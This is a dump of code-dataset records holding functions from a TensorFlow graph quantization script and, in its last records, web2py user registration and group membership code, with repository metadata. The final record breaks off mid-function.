graph_pb2.GraphDef()\ninputs_to_rename = {}\n# We go through all the nodes, looking for any that match the patterns we\n# know how to optimize away.\nfor node in old_graph.node:\n  # We always start with a Quantize node, and examine its inputs to see if\n  # they are in a form that can be removed.\n  if node.op not in [\"Quantize\", \"QuantizeV2\"]:\n    continue\n  dequantize_node_name = node_name_from_input(node.input[0])\n  if dequantize_node_name not in old_nodes_map:\n    raise ValueError(\"Input node name '\" + dequantize_node_name +\n                     \"' not found in node '\" + node.name + \"'\")\n  dequantize_node = old_nodes_map[dequantize_node_name]\n  # Do we have a Dequantize feeding in, with the same type as the Quantize?\n  if dequantize_node.op != \"Dequantize\":\n    continue\n  if node.attr[\"T\"] != dequantize_node.attr[\"T\"]:\n    continue\n  # Now look at the other inputs, and ensure they're Min/Max nodes.\n  min_node_name = node_name_from_input(node.input[1])\n  max_node_name = node_name_from_input(node.input[2])\n  min_node = old_nodes_map[min_node_name]\n  max_node = old_nodes_map[max_node_name]\n  is_min_right_type = (min_node.op in [\"Min\", \"Dequantize\"])\n  is_max_right_type = (max_node.op in [\"Max\", \"Dequantize\"])\n  if not is_min_right_type or not is_max_right_type:\n    print(\"Didn't find expected types on inputs : %s, %s.\" % (min_node.op,\n                                                              max_node.op))\n    continue\n  min_node_input_name = node_name_from_input(min_node.input[0])\n  max_node_input_name = node_name_from_input(max_node.input[0])\n  # There are two different patterns for Min nodes we can recognize, one\n  # where the input comes directly from the same one as the Max, and\n  # another where we run it through another Min first, so check for both.\n  is_same_input = False\n  if min_node_input_name == max_node_input_name:\n    is_same_input = True\n  else:\n    first_min_node_input = old_nodes_map[min_node_input_name]\n    if first_min_node_input.op == \"Concat\":\n      second_min_node_name = node_name_from_input(\n          first_min_node_input.input[1])\n      second_min_node = old_nodes_map[second_min_node_name]\n      if second_min_node.op == \"Min\":\n        second_min_node_input_name = node_name_from_input(\n            second_min_node.input[0])\n        is_same_input = (second_min_node_input_name == max_node_input_name)\n  if not is_same_input:\n    print(\"Different min/max inputs: \" + min_node_input_name)\n    continue\n  # We recognize this pattern, so mark the graph edges to be rewired to\n  # route around it entirely, since we know it's a no-op.\n  dequantize_source_name = node_name_from_input(dequantize_node.input[0])\n  node_tensor_name = ensure_tensor_name_has_port(node.name)\n  min_tensor_name = node.name + \":1\"\n  max_tensor_name = node.name + \":2\"\n  inputs_to_rename[node_tensor_name] = dequantize_source_name\n  inputs_to_rename[min_tensor_name] = dequantize_node.input[1]\n  inputs_to_rename[max_tensor_name] = dequantize_node.input[2]\n# Finally we apply all the rewiring we've marked to the graph.\nfor node in old_graph.node:\n  for index, input_full_name in enumerate(node.input):\n    input_name = ensure_tensor_name_has_port(input_full_name)\n    if input_name in inputs_to_rename:\n      node.input[index] = inputs_to_rename[input_name]\n  self.add_output_graph_node(node)\nreturn self.output_graph", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Applies node renames in self.final_node_renames to self.output_graph.\"\"\"\n", "func_signal": "def apply_final_node_renames(self):\n", "code": "old_graph = self.output_graph\nself.output_graph = graph_pb2.GraphDef()\nfor node in old_graph.node:\n  node.name = self.final_node_renames.get(node.name, node.name)\n  for index, input_name in enumerate(node.input):\n    node_name = node_name_from_input(input_name)\n    input_full_name = ensure_tensor_name_has_port(input_name)\n    if node_name in self.final_node_renames:\n      node.input[index] = \"%s%s\" % (self.final_node_renames[node_name],\n                                    input_full_name[len(node_name):])\n  self.add_output_graph_node(node)\nreturn self.output_graph", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Quantize float Const ops.\n\nThere are two modes of operations, both replace float Const ops with\nquantized values.\n1. If quantization_mode is \"weights_rounded\", this function replaces float\nConst ops with quantized float Const ops - same as the original op, but\nfloat values being mapped to the center of one of 1<<FLAGS.bitdepth buckets.\nThis does not change the raw model size, but compression algorithms such as\nzip (as used for compressing apks) or bzip2 will achieve a very good\ncompression ratio.\n2. For other quantization modes (\"MIN_COMBINED\" or \"MIN_FIRST\"), float\nConst ops are quantized and replaced by a tuple of four ops to perform\nthe dequantization at runtime:\n* eight-bit Const (bucket indices, same shape as original float Const op\n* two float Const ops (min and max value of original float Const op)\n* Dequantize op to convert the eight-bit consts to float tensors.\nThe quantization mode is important because we see accuracy problems when\nquantizing weights for different situations depending on the algorithm\nused. We haven't figured out exactly what the underlying cause is yet,\nunfortunately.\n\nArgs:\n  input_graph: A GraphDef of the model containing float Const ops.\n  quantization_mode: How to quantize and dequantize the values.\n\nReturns:\n  A GraphDef of the converted graph.\n\nRaises:\n  ValueError: If quantization_mode is unsupported.\n\"\"\"\n", "func_signal": "def quantize_weights(self, input_graph, quantization_mode):\n", "code": "output_graph = graph_pb2.GraphDef()\nfor input_node in input_graph.node:\n  should_quantize = False\n  if input_node.op == \"Const\":\n    dtype = dtypes.as_dtype(input_node.attr[\"dtype\"].type)\n    if dtype == dtypes.float32:\n      should_quantize = True\n  if should_quantize:\n    if quantization_mode == \"weights_rounded\":\n      output_graph.node.extend(quantize_weight_rounded(input_node))\n    elif quantization_mode in (b\"MIN_COMBINED\", b\"MIN_FIRST\"):\n      output_graph.node.extend(\n          quantize_weight_eightbit(input_node, quantization_mode))\n    else:\n      raise ValueError(\"Unsupported quantization mode %s.\" %\n                       quantization_mode)\n  else:\n    output_node = node_def_pb2.NodeDef()\n    output_node.CopyFrom(input_node)\n    output_graph.node.extend([output_node])\nreturn output_graph", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"The entry point for transforming a graph into full eight bit.\"\"\"\n", "func_signal": "def eightbitize_nodes_recursively(self, current_node):\n", "code": "if current_node.name in self.state.already_visited:\n  if (self.should_merge_with_fake_quant_node() or\n      current_node.name in self.state.merged_with_fake_quant):\n    raise ValueError(\"Unsupported graph structure: output of node %s \"\n                     \"is processed by a FakeQuant* node and should have \"\n                     \"no other outputs.\", current_node.name)\n  return\nself.state.already_visited[current_node.name] = True\n\nfor i, input_node_name in enumerate(current_node.input):\n  quantize_input = False\n  if current_node.op in (\"MatMul\", \"Conv2D\", \"BiasAdd\", \"MaxPool\",\n                         \"AvgPool\", \"Relu\", \"Relu6\",\n                         \"BatchNormWithGlobalNormalization\"):\n    quantize_input = True\n  elif current_node.op == \"Concat\" and i > 0:\n    quantize_input = (\n        dtypes.as_dtype(current_node.attr[\"T\"].type) == dtypes.float32)\n  elif current_node.op == \"Reshape\" and i == 0:\n    quantize_input = (\n        dtypes.as_dtype(current_node.attr[\"T\"].type) == dtypes.float32)\n\n  self.state.output_node_stack.append((current_node, i, quantize_input))\n\n  input_node_name = node_name_from_input(input_node_name)\n  input_node = self.nodes_map[input_node_name]\n  self.eightbitize_nodes_recursively(input_node)\n\n  self.state.output_node_stack.pop()\n\nif current_node.op == \"MatMul\":\n  self.eightbitize_mat_mul_node(current_node)\nelif current_node.op == \"Conv2D\":\n  self.eightbitize_conv_node(current_node)\nelif current_node.op == \"BiasAdd\":\n  self.eightbitize_bias_add_node(current_node)\nelif current_node.op == \"MaxPool\" or current_node.op == \"AvgPool\":\n  self.eightbitize_single_input_tensor_node(current_node,\n                                            self.add_pool_function)\nelif current_node.op == \"Relu\" or current_node.op == \"Relu6\":\n  self.eightbitize_single_input_tensor_node(current_node,\n                                            self.add_relu_function)\nelif (current_node.op == \"Concat\" and\n      dtypes.as_dtype(current_node.attr[\"T\"].type) == dtypes.float32):\n  self.eightbitize_concat_node(current_node)\nelif current_node.op == \"BatchNormWithGlobalNormalization\":\n  self.eightbitize_batch_norm_node(current_node)\nelif (current_node.op == \"Reshape\" and\n      dtypes.as_dtype(current_node.attr[\"T\"].type) == dtypes.float32):\n  self.eightbitize_reshape_node(current_node)\nelif (self.input_range and\n      current_node.op in (\"Placeholder\", \"PlaceholderV2\")):\n  self.eightbitize_placeholder_node(current_node)\nelif current_node.op == \"FakeQuantWithMinMaxVars\":\n  # It will have been merged into the underlying node.\n  pass\nelif current_node.op == \"Const\":\n  if self.should_quantize_const(current_node):\n    for n in quantize_weight_eightbit(current_node, b\"MIN_FIRST\"):\n      self.add_output_graph_node(n)\n  else:\n    new_node = node_def_pb2.NodeDef()\n    new_node.CopyFrom(current_node)\n    self.add_output_graph_node(new_node)\n\n###################################################################\n# Note: if more cases are added here, you may need to update the op\n# name lists in the loop over children at the start of the function.\n###################################################################\nelse:\n  new_node = node_def_pb2.NodeDef()\n  new_node.CopyFrom(current_node)\n  self.add_output_graph_node(new_node)\n\nif (self.should_merge_with_fake_quant_node() and\n    current_node.name not in self.state.merged_with_fake_quant):\n  raise ValueError(\n      \"FakeQuant* node %s failed to merge with node %s of type %s\" %\n      (self.state.output_node_stack[-1][0], current_node.name,\n       current_node.op))", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Replaces a BiasAdd node with the eight bit equivalent sub-graph.\"\"\"\n", "func_signal": "def eightbitize_bias_add_node(self, original_node):\n", "code": "quantized_bias_add_name = (\n    original_node.name + \"_eightbit_quantized_bias_add\")\nall_input_names = self.add_eightbit_prologue_nodes(original_node)\nquantized_bias_add_node = create_node(\"QuantizedBiasAdd\",\n                                      quantized_bias_add_name,\n                                      all_input_names)\nset_attr_dtype(quantized_bias_add_node, \"T1\", dtypes.quint8)\nset_attr_dtype(quantized_bias_add_node, \"T2\", dtypes.quint8)\nset_attr_dtype(quantized_bias_add_node, \"out_type\", dtypes.qint32)\nself.add_output_graph_node(quantized_bias_add_node)\nquantize_down_name = self.add_quantize_down_nodes(original_node,\n                                                  quantized_bias_add_name)\nself.add_dequantize_result_node(quantize_down_name, original_node.name)", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Triggers rewriting of the float graph.\n\nArgs:\n  output_node_names: A list of names of the nodes that produce the final\n    results.\n\nReturns:\n  A quantized version of the float graph.\n\"\"\"\n", "func_signal": "def rewrite(self, output_node_names):\n", "code": "self.output_graph = graph_pb2.GraphDef()\noutput_nodes = [\n    self.nodes_map[output_node_name]\n    for output_node_name in output_node_names\n]\nif self.mode == \"round\":\n  self.already_visited = {}\n  for output_node in output_nodes:\n    self.round_nodes_recursively(output_node)\nelif self.mode == \"quantize\":\n  self.already_visited = {}\n  self.already_quantized = {}\n  for output_node in output_nodes:\n    self.quantize_nodes_recursively(output_node)\nelif self.mode == \"eightbit\":\n  self.set_input_graph(graph_util.remove_training_nodes(self.input_graph))\n  output_nodes = [\n      self.nodes_map[output_node_name]\n      for output_node_name in output_node_names\n  ]\n\n  self.state = EightbitizeRecursionState(\n      already_visited={}, output_node_stack=[], merged_with_fake_quant={})\n  for output_node in output_nodes:\n    self.eightbitize_nodes_recursively(output_node)\n  self.state = None\n  if self.input_range:\n    self.add_output_graph_node(\n        create_constant_node(\"quantized_input_min_value\", self.input_range[\n            0], dtypes.float32, []))\n    self.add_output_graph_node(\n        create_constant_node(\"quantized_input_max_value\", self.input_range[\n            1], dtypes.float32, []))\n  if self.fallback_quantization_range:\n    self.add_output_graph_node(\n        create_constant_node(\"fallback_quantization_min_value\",\n                             self.fallback_quantization_range[0],\n                             dtypes.float32, []))\n    self.add_output_graph_node(\n        create_constant_node(\"fallback_quantization_max_value\",\n                             self.fallback_quantization_range[1],\n                             dtypes.float32, []))\n  if FLAGS.strip_redundant_quantization:\n    self.output_graph = self.remove_redundant_quantization(\n        self.output_graph)\n    self.remove_dead_nodes(output_node_names)\n  self.apply_final_node_renames()\nelif self.mode == \"weights\":\n  self.output_graph = self.quantize_weights(self.input_graph,\n                                            b\"MIN_COMBINED\")\n  self.remove_dead_nodes(output_node_names)\nelif self.mode == \"weights_rounded\":\n  self.output_graph = self.quantize_weights(self.input_graph, self.mode)\n  self.remove_dead_nodes(output_node_names)\nelse:\n  print(\"Bad mode - \" + self.mode + \".\")\nreturn self.output_graph", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Handles quantizing a single node.\"\"\"\n", "func_signal": "def quantize_node(self, input_node):\n", "code": "input_name = input_node.name\nif input_name in self.already_quantized:\n  return\nself.already_quantized[input_name] = True\noriginal_input_name = input_name + \"_original\"\nreshape_name = input_name + \"_reshape\"\nreshape_dims_name = input_name + \"_reshape_dims\"\nmax_name = input_name + \"_max\"\nmin_name = input_name + \"_min\"\ndims_name = input_name + \"_dims\"\nquantize_name = input_name + \"_quantize\"\ndequantize_name = input_name\noriginal_input_node = node_def_pb2.NodeDef()\noriginal_input_node.CopyFrom(input_node)\noriginal_input_node.name = original_input_name\nself.add_output_graph_node(original_input_node)\nreshape_dims_node = create_constant_node(reshape_dims_name, -1,\n                                         dtypes.int32, [1])\nself.add_output_graph_node(reshape_dims_node)\nreshape_node = create_node(\"Reshape\", reshape_name,\n                           [original_input_name, reshape_dims_name])\nset_attr_dtype(reshape_node, \"T\", dtypes.float32)\nself.add_output_graph_node(reshape_node)\ndims_node = create_constant_node(dims_name, 0, dtypes.int32, [1])\nself.add_output_graph_node(dims_node)\nmax_node = create_node(\"Max\", max_name, [reshape_name, dims_name])\nset_attr_dtype(max_node, \"T\", dtypes.float32)\nset_attr_bool(max_node, \"keep_dims\", False)\nself.add_output_graph_node(max_node)\nmin_node = create_node(\"Min\", min_name, [reshape_name, dims_name])\nset_attr_dtype(min_node, \"T\", dtypes.float32)\nset_attr_bool(min_node, \"keep_dims\", False)\nself.add_output_graph_node(min_node)\nquantize_node = create_node(\"Quantize\", quantize_name,\n                            [original_input_name, min_name, max_name])\nset_attr_dtype(quantize_node, \"T\", dtypes.quint8)\nset_attr_string(quantize_node, \"mode\", b\"MIN_FIRST\")\nself.add_output_graph_node(quantize_node)\ndequantize_node = create_node(\"Dequantize\", dequantize_name,\n                              [quantize_name, min_name, max_name])\nset_attr_dtype(dequantize_node, \"T\", dtypes.quint8)\nset_attr_string(dequantize_node, \"mode\", b\"MIN_FIRST\")\nself.add_output_graph_node(dequantize_node)", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"The entry point for simple rounding quantization.\"\"\"\n", "func_signal": "def round_nodes_recursively(self, current_node):\n", "code": "if self.already_visited[current_node.name]:\n  return\nself.already_visited[current_node.name] = True\nfor input_node_name in current_node.input:\n  input_node_name = node_name_from_input(input_node_name)\n  input_node = self.nodes_map[input_node_name]\n  self.round_nodes_recursively(input_node)\nnodes_to_quantize = [\"Conv2D\", \"BiasAdd\", \"MatMul\"]\nif any(current_node.op in s for s in nodes_to_quantize):\n  new_node = node_def_pb2.NodeDef()\n  new_node.CopyFrom(current_node)\n  new_node.name = current_node.name + \"_original\"\n  self.add_output_graph_node(new_node)\n  levels = 1 << FLAGS.bitdepth\n  constant_name = current_node.name + \"_round_depth\"\n  constant_tensor = constant_op.constant(\n      levels, dtype=dtypes.int32, name=constant_name)\n  constant_node = constant_tensor.op.node_def\n  self.add_output_graph_node(constant_node)\n  quantize_node = node_def_pb2.NodeDef()\n  quantize_node.op = \"RoundToSteps\"\n  quantize_node.name = current_node.name\n  quantize_node.input.extend([current_node.name + \"_original\"])\n  quantize_node.input.extend([constant_node.name])\n  self.add_output_graph_node(quantize_node)\nelse:\n  new_node = node_def_pb2.NodeDef()\n  new_node.CopyFrom(current_node)\n  self.add_output_graph_node(new_node)", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Adds input conversion nodes to handle quantizing the underlying node.\"\"\"\n", "func_signal": "def add_eightbit_prologue_nodes(self, original_node):\n", "code": "namespace_prefix = original_node.name + \"_eightbit\"\nreshape_dims_name, reduction_dims_name = self.add_common_quantization_nodes(\n    namespace_prefix)\ninput_names = []\nmin_max_names = []\nfor original_input_name in original_node.input:\n  quantize_input_name, min_input_name, max_input_name = (\n      self.eightbitize_input_to_node(namespace_prefix, original_input_name,\n                                     reshape_dims_name,\n                                     reduction_dims_name))\n  input_names.append(quantize_input_name)\n  min_max_names.append(min_input_name)\n  min_max_names.append(max_input_name)\nall_input_names = []\nall_input_names.extend(input_names)\nall_input_names.extend(min_max_names)\nreturn all_input_names", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Builds constant nodes needed for quantization of inputs.\"\"\"\n", "func_signal": "def add_common_quantization_nodes(self, namespace_prefix):\n", "code": "reshape_dims_name = namespace_prefix + \"_reshape_dims\"\nreduction_dims_name = namespace_prefix + \"_reduction_dims\"\n\nreshape_dims_node = create_constant_node(reshape_dims_name, -1,\n                                         dtypes.int32, [1])\nself.add_output_graph_node(reshape_dims_node)\nreduction_dims_node = create_constant_node(reduction_dims_name, 0,\n                                           dtypes.int32, [1])\nself.add_output_graph_node(reduction_dims_node)\nreturn reshape_dims_name, reduction_dims_name", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Makes sure that a tensor name has :0 if no explicit port exists.\"\"\"\n", "func_signal": "def ensure_tensor_name_has_port(node_name):\n", "code": "m = re.search(r\"(.*):\\d+$\", node_name)\nif m:\n  name_with_port = node_name\nelse:\n  name_with_port = node_name + \":0\"\nreturn name_with_port", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Returns a replacement node for input_node containing bucketed floats.\"\"\"\n", "func_signal": "def quantize_weight_rounded(input_node):\n", "code": "input_tensor = input_node.attr[\"value\"].tensor\ntensor_value = tensor_util.MakeNdarray(input_tensor)\nshape = input_tensor.tensor_shape\n# Currently, the parameter FLAGS.bitdepth is used to compute the\n# number of buckets as 1 << FLAGS.bitdepth, meaning the number of\n# buckets can only be a power of 2.\n# This could be fixed by introducing a new parameter, num_buckets,\n# which would allow for more flexibility in chosing the right model\n# size/accuracy tradeoff. But I didn't want to add more parameters\n# to this script than absolutely necessary.\nnum_buckets = 1 << FLAGS.bitdepth\ntensor_value_rounded = quantize_array(tensor_value, num_buckets)\ntensor_shape_list = tensor_util.TensorShapeProtoToList(shape)\nreturn [\n    create_constant_node(\n        input_node.name,\n        tensor_value_rounded,\n        dtypes.float32,\n        shape=tensor_shape_list)\n]", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"The entry point for quantizing nodes to eight bit and back.\"\"\"\n", "func_signal": "def quantize_nodes_recursively(self, current_node):\n", "code": "if self.already_visited[current_node.name]:\n  return\nself.already_visited[current_node.name] = True\nfor input_node_name in current_node.input:\n  input_node_name = node_name_from_input(input_node_name)\n  input_node = self.nodes_map[input_node_name]\n  self.quantize_nodes_recursively(input_node)\nnodes_to_quantize = [\"Conv2D\", \"BiasAdd\", \"MatMul\"]\nif any(current_node.op in s for s in nodes_to_quantize):\n  for input_name in current_node.input:\n    input_name = node_name_from_input(input_name)\n    input_node = self.nodes_map[input_name]\n    self.quantize_node(input_node)\n  self.quantize_node(current_node)\nelse:\n  new_node = node_def_pb2.NodeDef()\n  new_node.CopyFrom(current_node)\n  self.add_output_graph_node(new_node)", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Replaces a MatMul node with the eight bit equivalent sub-graph.\"\"\"\n", "func_signal": "def eightbitize_batch_norm_node(self, original_node):\n", "code": "namespace_prefix = original_node.name + \"_eightbit\"\noriginal_input_name = original_node.input[0]\noriginal_mean_name = original_node.input[1]\noriginal_variance_name = original_node.input[2]\noriginal_beta_name = original_node.input[3]\noriginal_gamma_name = original_node.input[4]\nquantized_batch_norm_name = namespace_prefix + \"_quantized_batch_norm\"\n\nreshape_dims_name, reduction_dims_name = self.add_common_quantization_nodes(\n    namespace_prefix)\nquantize_input_name, min_input_name, max_input_name = (\n    self.eightbitize_input_to_node(namespace_prefix, original_input_name,\n                                   reshape_dims_name, reduction_dims_name))\nquantize_mean_name, min_mean_name, max_mean_name = (\n    self.eightbitize_input_to_node(namespace_prefix, original_mean_name,\n                                   reshape_dims_name, reduction_dims_name))\nquantize_variance_name, min_variance_name, max_variance_name = (\n    self.eightbitize_input_to_node(namespace_prefix, original_variance_name,\n                                   reshape_dims_name, reduction_dims_name))\nquantize_beta_name, min_beta_name, max_beta_name = (\n    self.eightbitize_input_to_node(namespace_prefix, original_beta_name,\n                                   reshape_dims_name, reduction_dims_name))\nquantize_gamma_name, min_gamma_name, max_gamma_name = (\n    self.eightbitize_input_to_node(namespace_prefix, original_gamma_name,\n                                   reshape_dims_name, reduction_dims_name))\nquantized_batch_norm_node = create_node(\n    \"QuantizedBatchNormWithGlobalNormalization\", quantized_batch_norm_name,\n    [\n        quantize_input_name, min_input_name, max_input_name,\n        quantize_mean_name, min_mean_name, max_mean_name,\n        quantize_variance_name, min_variance_name, max_variance_name,\n        quantize_beta_name, min_beta_name, max_beta_name,\n        quantize_gamma_name, min_gamma_name, max_gamma_name\n    ])\nset_attr_dtype(quantized_batch_norm_node, \"Tinput\", dtypes.quint8)\nset_attr_dtype(quantized_batch_norm_node, \"out_type\", dtypes.qint32)\ncopy_attr(quantized_batch_norm_node, \"scale_after_normalization\",\n          original_node.attr[\"scale_after_normalization\"])\ncopy_attr(quantized_batch_norm_node, \"variance_epsilon\",\n          original_node.attr[\"variance_epsilon\"])\nself.add_output_graph_node(quantized_batch_norm_node)\nquantize_down_name = self.add_quantize_down_nodes(original_node,\n                                                  quantized_batch_norm_name)\nself.add_dequantize_result_node(quantize_down_name, original_node.name)", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Replaces a Reshape node with the eight bit equivalent sub-graph.\n\nArgs:\n  original_node: Float node to be converted.\n\nReturns:\n  Subgraph representing the quantized version of the original node.\n\n\"\"\"\n", "func_signal": "def eightbitize_reshape_node(self, original_node):\n", "code": "namespace_prefix = original_node.name + \"_eightbit\"\nquantized_reshape_name = namespace_prefix + \"_quantized_reshape\"\nreshape_dims_name, reduction_dims_name = self.add_common_quantization_nodes(\n    namespace_prefix)\nshape_input_name = original_node.input[1]\nquantize_input_name, min_input_name, max_input_name = (\n    self.eightbitize_input_to_node(namespace_prefix, original_node.input[0],\n                                   reshape_dims_name, reduction_dims_name))\nquantized_reshape_node = create_node(\n    \"QuantizedReshape\", quantized_reshape_name,\n    [quantize_input_name, shape_input_name, min_input_name, max_input_name])\nset_attr_dtype(quantized_reshape_node, \"T\", dtypes.quint8)\nself.add_output_graph_node(quantized_reshape_node)\nself.add_dequantize_result_node(quantized_reshape_name, original_node.name)", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Strips off ports and other decorations to get the underlying node name.\"\"\"\n", "func_signal": "def node_name_from_input(node_name):\n", "code": "if node_name.startswith(\"^\"):\n  node_name = node_name[1:]\nm = re.search(r\"(.*):\\d+$\", node_name)\nif m:\n  node_name = m.group(1)\nreturn node_name", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"Returns replacement nodes for input_node using the Dequantize op.\"\"\"\n", "func_signal": "def quantize_weight_eightbit(input_node, quantization_mode):\n", "code": "base_name = input_node.name + \"_\"\nquint8_const_name = base_name + \"quint8_const\"\nmin_name = base_name + \"min\"\nmax_name = base_name + \"max\"\nfloat_tensor = tensor_util.MakeNdarray(input_node.attr[\"value\"].tensor)\nmin_value = np.min(float_tensor.flatten())\nmax_value = np.max(float_tensor.flatten())\n# Make sure that the range includes zero.\nif min_value > 0.0:\n  min_value = 0.0\n# min_value == max_value is a tricky case. It can occur for general\n# tensors, and of course for scalars. The quantized ops cannot deal\n# with this case, so we set max_value to something else.\n# It's a tricky question what is the numerically best solution to\n# deal with this degeneracy.\n# TODO(petewarden): Better use a tolerance than a hard comparison?\nif min_value == max_value:\n  if abs(min_value) < 0.000001:\n    max_value = min_value + 1.0\n  elif min_value > 0:\n    max_value = 2 * min_value\n  else:\n    max_value = min_value / 2.0\n\nsess = session.Session()\nwith sess.as_default():\n  quantize_op = array_ops.quantize_v2(\n      float_tensor,\n      min_value,\n      max_value,\n      dtypes.quint8,\n      mode=quantization_mode)\n  quint8_tensor = quantize_op[0].eval()\nshape = tensor_util.TensorShapeProtoToList(input_node.attr[\"value\"]\n                                           .tensor.tensor_shape)\nquint8_const_node = create_constant_node(\n    quint8_const_name, quint8_tensor, dtypes.quint8, shape=shape)\nmin_node = create_constant_node(min_name, min_value, dtypes.float32)\nmax_node = create_constant_node(max_name, max_value, dtypes.float32)\ndequantize_node = create_node(\"Dequantize\", input_node.name,\n                              [quint8_const_name, min_name, max_name])\nset_attr_dtype(dequantize_node, \"T\", dtypes.quint8)\nset_attr_string(dequantize_node, \"mode\", quantization_mode)\nreturn [quint8_const_node, min_node, max_node, dequantize_node]", "path": "sketch-to-react-native/scripts/quantize_graph.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nanohop/sketch-to-react-native", "stars": 2335, "license": "mit", "language": "python", "size": 5533}
{"docstring": "\"\"\"\nGives user_id membership of group_id or role\nif user is None than user_id is that of current logged in user\n\"\"\"\n\n", "func_signal": "def add_membership(self, group_id=None, user_id=None, role=None):\n", "code": "group_id = group_id or self.id_group(role)\ntry:\n    group_id = int(group_id)\nexcept:\n    group_id = self.id_group(group_id)  # interpret group_id as a role\nif not user_id and self.user:\n    user_id = self.user.id\nif not group_id:\n    raise ValueError('group_id not provided or invalid')\nif not user_id:\n    raise ValueError('user_id not provided or invalid')\nmembership = self.table_membership()\ndb = membership._db\nrecord = db((membership.user_id == user_id) &\n            (membership.group_id == group_id),\n            ignore_common_filters=True).select().first()\nif record:\n    if hasattr(record, 'is_active') and not record.is_active:\n        record.update_record(is_active=True)\n    return record.id\nelse:\n    id = membership.insert(group_id=group_id, user_id=user_id)\nif role and user_id == self.user_id:\n    self.user_groups[group_id] = role\nelse:\n    self.update_groups()\nself.log_event(self.messages['add_membership_log'],\n               dict(user_id=user_id, group_id=group_id))\nreturn id", "path": "web2py/gluon/authapi.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nRegister a user.\n\"\"\"\n\n", "func_signal": "def register(self, log=DEFAULT, **kwargs):\n", "code": "table_user = self.table_user()\nsettings = self.settings\n\nif self.is_logged_in():\n    raise AssertionError('User trying to register is logged in')\n\nif log is DEFAULT:\n    log = self.messages['register_log']\n\nif self.settings.login_userfield:\n    userfield = self.settings.login_userfield\nelif 'username' in table_user.fields:\n    userfield = 'username'\nelse:\n    userfield = 'email'\n\n# Ensure the username field is unique.\nunique_validator = IS_NOT_IN_DB(self.db, table_user[userfield])\nuserfield_validator = table_user[userfield].requires\nif userfield_validator is None:\n    userfield_validator = unique_validator\nelif isinstance(userfield_validator, (list, tuple)):\n    if not any([isinstance(validator, IS_NOT_IN_DB) for validator in\n                userfield_validator]):\n        if isinstance(userfield_validator, list):\n            userfield_validator.append(unique_validator)\n        else:\n            userfield_validator += (unique_validator, )\nelif not isinstance(userfield_validator, IS_NOT_IN_DB):\n    userfield_validator = [userfield_validator, unique_validator]\ntable_user[userfield].requires = userfield_validator\n\npassfield = settings.password_field\n\ntry:  # Make sure we have our original minimum length\n    table_user[passfield].requires[-1].min_length = settings.password_min_length\nexcept:\n    pass\n\nkey = web2py_uuid()\nif settings.registration_requires_approval:\n    key = 'pending-' + key\n\ntable_user.registration_key.default = key\n\nresult = table_user.validate_and_insert(**kwargs)\nif result.errors:\n    return {'errors': result.errors.as_dict(), 'message': None, 'user': None}\n\nuser = table_user[result.id]\n\nmessage = self.messages.registration_successful\n\nif settings.create_user_groups:\n    d = user.as_dict()\n    description = self.messages.group_description % d\n    group_id = self.add_group(settings.create_user_groups % d, description)\n    self.add_membership(group_id, result.id)\n\nif self.settings.everybody_group_id:\n    